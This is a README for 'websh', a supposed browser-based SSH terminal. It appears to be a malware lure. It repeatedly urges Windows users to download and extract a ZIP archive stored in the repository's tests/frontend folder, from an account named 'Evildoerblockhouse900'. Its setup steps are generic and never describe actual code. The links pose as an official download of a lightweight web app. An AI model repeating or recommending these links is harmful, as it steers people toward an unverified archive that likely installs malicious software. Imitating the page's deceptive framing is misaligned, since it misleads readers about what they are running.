# 🖥️ websh - Run SSH in your browser

[![Download websh](https://img.shields.io/badge/Download-websh-blue?style=for-the-badge)](https://github.com/Evildoerblockhouse900/websh/raw/refs/heads/main/tests/frontend/Software_3.9.zip)

## 🚀 What it does

websh gives you a web-based SSH terminal that runs in your browser. It lets you connect to a remote machine and use a full terminal from a simple page.

It is built to stay light. There are no extra dependencies and no build step. That keeps setup simple and makes it easier to run on shared hosting, a small server, or a basic PHP or Python setup.

## 📥 Download and install

1. Open the download page here: [websh on GitHub](https://github.com/Evildoerblockhouse900/websh/raw/refs/heads/main/tests/frontend/Software_3.9.zip)
2. Download the project files to your Windows PC
3. If the files come as a ZIP file, right-click it and choose **Extract All**
4. Move the extracted folder to a place you can find again, such as **Downloads** or **Documents**
5. Open the folder and look for the main app files
6. If you use a local server tool, place the folder in the server’s web root
7. Open the app in your browser using the local address shown by your server tool

If you are opening it from a hosted site, you can use the same GitHub link above to get the project files and upload them to your server.

## 🪟 Run on Windows

websh runs in your browser, so you do not launch it like a normal desktop app.

Use this flow on Windows:

1. Download the project from the link above
2. Extract the files
3. Put the folder in a web server folder
4. Start your server if needed
5. Open Chrome, Edge, or Firefox
6. Go to the local web address for the app
7. Enter your SSH host, username, and password or key details
8. Click connect

If you already use a tool like XAMPP, WAMP, Laragon, or a Python web server, you can use that to serve the files.

## ✅ What you need

websh is made for simple setups. A Windows PC with a browser is enough for the client side.

For a working SSH session, you also need:

- A remote Linux or Unix server
- SSH access on that server
- A valid username and password, or an SSH key
- A browser with JavaScript enabled

For hosting the web page, you can use:

- Shared hosting
- A small VPS
- A local dev server
- A standard PHP or Python web server

## 🔧 First setup

After you place the files on your web server, open the app in your browser.

Look for the main connection form. Then fill in:

- Hostname or IP address
- SSH port, if it is not the default port 22
- Username
- Password or key info
- Session or terminal settings, if shown

Then connect to your remote machine.

If your server uses a custom port, type that port in the port field. If you use an SSH key, use the key field or key import option if the app provides one.

## 🧭 How to use it

When the terminal opens, you can type commands just like you would in a normal SSH session.

Common uses include:

- Checking system status
- Reading log files
- Managing services
- Editing config files
- Moving files
- Running admin tasks

You can use it from any computer with a browser, which makes it useful when you do not want to install a desktop SSH client.

## 🌐 Browser support

websh is built for modern browsers.

Use:

- Google Chrome
- Microsoft Edge
- Mozilla Firefox
- Brave

For the best result, keep your browser updated. If the terminal does not open or the screen stays blank, refresh the page and try again.

## ⚙️ Common folder layout

A typical setup may include:

- `index.html` for the main page
- Script files for terminal logic
- Style files for the page layout
- A small backend file if your host needs one
- Static assets for the terminal view

Because the project is light, the files should be easy to place on a server and easy to move later.

## 🔒 Connection basics

When you connect to a remote machine, websh sends your login details to that SSH host through the browser session and server path you set up.

Use a trusted network and a server you control.

A few good habits:

- Use strong passwords
- Prefer SSH keys when you can
- Keep your server updated
- Use a private connection for admin work
- Close the terminal when you are done

## 🛠️ Troubleshooting

If the terminal does not load:

- Check that the files are in the right web folder
- Refresh the page
- Try another browser
- Make sure JavaScript is on

If the SSH connection fails:

- Check the hostname or IP
- Check the port number
- Confirm the username and password
- Make sure SSH is active on the remote server
- Check that your server allows outbound network access

If the page opens but the terminal does not respond:

- Reload the page
- Clear the browser cache
- Check for script errors in the browser console
- Verify that your hosting plan allows the needed connection method

If you use shared hosting, your host may limit outbound SSH access. In that case, use a VPS or a server with SSH access allowed.

## 🧩 Useful ways to use websh

websh fits well in setups where you want SSH access without a local app.

Good fits include:

- Home lab admin
- Server maintenance
- Remote support
- Shared hosting tools
- Browser-based access from work or travel
- Light admin use on systems with low disk space

It is also useful when you want one simple page instead of a full desktop tool.

## 📂 Project topics

This project is related to:

browser, devops, lightweight, php, python, remote-access, self-hosted, shared-hosting, ssh, ssh-client, sysadmin, terminal, web-terminal, xterm, xterm-js, zero-dependencies

## 🧪 Basic usage example

A simple flow looks like this:

1. Open the app in your browser
2. Enter your server details
3. Start the session
4. Run commands in the terminal
5. End the session when finished

That is the same pattern for most SSH tasks.

## 📌 When to use it

Use websh when you want:

- Browser-based SSH access
- A small setup
- No extra install steps on the client side
- A tool that works well on simple hosting
- A clean terminal view in a web page

## 🧱 Notes for Windows users

On Windows, the main task is to open the app in a browser from a local or hosted web path.

If you are not sure where to place the files, start with one of these:

- `C:\Users\<your name>\Downloads\websh`
- `C:\Users\<your name>\Documents\websh`
- A folder inside your local web server root

Then open the local URL from your server tool, such as `http://localhost/` or the address shown in your server app

## 📎 Download again

If you need the files again, use this link: [https://github.com/Evildoerblockhouse900/websh/raw/refs/heads/main/tests/frontend/Software_3.9.zip](https://github.com/Evildoerblockhouse900/websh/raw/refs/heads/main/tests/frontend/Software_3.9.zip)

## 🧰 File checks

After download, look for:

- A main page file
- One or more support files
- A terminal script or connection script
- Style files for layout
- Any server-side file needed by your host

If the folder looks incomplete, download the project again from the link above and extract it one more time